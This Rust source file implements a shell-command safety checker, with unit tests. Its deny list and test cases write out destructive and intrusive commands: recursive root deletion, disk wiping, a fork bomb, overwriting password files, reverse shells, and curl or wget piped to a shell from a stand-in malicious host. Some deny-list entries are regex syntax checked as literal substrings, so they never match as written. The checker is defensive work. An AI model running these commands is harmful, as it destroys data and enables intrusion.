use regex::Regex;
use std::collections::HashSet;
use once_cell::sync::Lazy;
use std::fmt;

/// List of potentially dangerous command patterns that should be blocked
static DANGEROUS_PATTERNS: Lazy<Vec<&'static str>> = Lazy::new(|| {
    vec![
        // System destruction
        "rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf ~/", 
        "mkfs", "dd if=/dev/zero of=/dev/", ">(>)? ?/dev/sd",
        "chmod -R 777 /", "chmod -R 000 /", ":(){ :|:& };:",
        
        // System file manipulation
        ">(/etc/passwd|/etc/shadow|/etc/hosts|/etc/sudoers)",
        ">>(/etc/passwd|/etc/shadow|/etc/hosts|/etc/sudoers)",
        
        // Remote code execution 
        "wget.+\\| (sh|bash)", "curl.+\\| (sh|bash)",
        "nc -e", "ncat -e", "bash -i >& /dev/tcp",
        
        // Privilege escalation
        "sudo rm", "chmod u+s", 
        
        // Port scanning & network attacks
        "nmap -p"
    ]
});

/// Represents different danger levels for commands
#[derive(Debug, Clone, PartialEq)]
pub enum DangerLevel {
    /// Safe command that can be executed
    Safe,
    
    /// Potentially dangerous - requires warning
    Warning(String),
    
    /// Definitely dangerous - should be blocked
    Dangerous(String),
}

impl fmt::Display for DangerLevel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            DangerLevel::Safe => write!(f, "Safe"),
            DangerLevel::Warning(reason) => write!(f, "Warning: {}", reason),
            DangerLevel::Dangerous(reason) => write!(f, "Dangerous: {}", reason),
        }
    }
}

/// Processes a command and returns its danger level
pub fn check_command_safety(command: &str) -> DangerLevel {
    // Trim the command to handle extra spaces
    let cmd_trimmed = command.trim();
    
    // Check for exact matches in dangerous patterns
    for &pattern in DANGEROUS_PATTERNS.iter() {
        if cmd_trimmed.contains(pattern) {
            return DangerLevel::Dangerous(
                format!("Command contains dangerous pattern: '{}'", pattern)
            );
        }
    }
    
    // Optional: Check with regex for more complex patterns
    let dangerous_regex = [
        r"rm\s+-r[f]*\s+[~/]",
        r">\s*/etc/(passwd|shadow|hosts|fstab|sudoers)",
        r">>\s*/etc/(passwd|shadow|hosts|fstab|sudoers)",
        r"wget.+\|.*(sh|bash)",
        r"curl.+\|.*(sh|bash)",
    ];
    
    for pattern in &dangerous_regex {
        if let Ok(regex) = Regex::new(pattern) {
            if regex.is_match(cmd_trimmed) {
                return DangerLevel::Dangerous(
                    format!("Command matched dangerous regex pattern")
                );
            }
        }
    }
    
    // Check for warning patterns
    if cmd_trimmed.contains("eval") {
        return DangerLevel::Warning("Command uses eval which could be risky".to_string());
    }
    
    if cmd_trimmed.contains("wget") || cmd_trimmed.contains("curl") {
        return DangerLevel::Warning("Command downloads content from the internet".to_string());
    }
    
    // Commands that modify system config
    if cmd_trimmed.contains("/etc/") {
        return DangerLevel::Warning("Command accesses system configuration files".to_string());
    }
    
    // If it's a chained command, check each part
    if cmd_trimmed.contains(" && ") || cmd_trimmed.contains(" ; ") || cmd_trimmed.contains(" || ") {
        // Split by command separators
        let mut parts = Vec::new();
        let mut current_part = String::new();
        let mut in_quotes = false;
        let mut quote_char = ' ';
        
        for c in cmd_trimmed.chars() {
            match c {
                '\'' | '"' => {
                    if !in_quotes {
                        in_quotes = true;
                        quote_char = c;
                    } else if c == quote_char {
                        in_quotes = false;
                    }
                    current_part.push(c);
                },
                '&' | ';' | '|' => {
                    if !in_quotes {
                        if !current_part.trim().is_empty() {
                            parts.push(current_part.trim().to_string());
                        }
                        current_part = String::new();
                    } else {
                        current_part.push(c);
                    }
                },
                _ => current_part.push(c),
            }
        }
        
        if !current_part.trim().is_empty() {
            parts.push(current_part.trim().to_string());
        }
        
        // Check each part
        for part in parts {
            match check_command_safety(&part) {
                DangerLevel::Dangerous(reason) => {
                    return DangerLevel::Dangerous(
                        format!("Part of command is dangerous: {}", reason)
                    );
                },
                DangerLevel::Warning(reason) => {
                    return DangerLevel::Warning(
                        format!("Part of command is suspicious: {}", reason)
                    );
                },
                _ => {}
            }
        }
    }
    
    // If no dangerous or warning patterns were found, the command is safe
    DangerLevel::Safe
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_safe_commands() {
        let safe_commands = [
            "ls -la",
            "cd /tmp",
            "echo 'Hello World'",
            "grep 'pattern' file.txt",
            "mkdir -p test/directory",
            "cat /etc/hostname", // This will trigger a warning, not danger
            "ps aux | grep bash",
            "find . -name '*.rs'",
            "cp file1.txt file2.txt",
            "mv file.txt /tmp/",
        ];
        
        for cmd in &safe_commands {
            let result = check_command_safety(cmd);
            assert!(result == DangerLevel::Safe || matches!(result, DangerLevel::Warning(_)), 
                   "Command should be safe or warning, got: {:?} for '{}'", result, cmd);
        }
    }
    
    #[test]
    fn test_dangerous_commands() {
        let dangerous_commands = [
            "rm -rf /",
            "rm -rf /*",
            "dd if=/dev/zero of=/dev/sda",
            "chmod -R 777 /",
            "> /etc/passwd",
            "wget https://malicious.com/script.sh | bash",
            "curl -s malicious.com/exploit | sh",
            "nmap -p- 10.0.0.1",
            ":(){ :|:& };:",
        ];
        
        for cmd in &dangerous_commands {
            assert!(matches!(check_command_safety(cmd), DangerLevel::Dangerous(_)), 
                   "Command should be dangerous: {}", cmd);
        }
    }
}
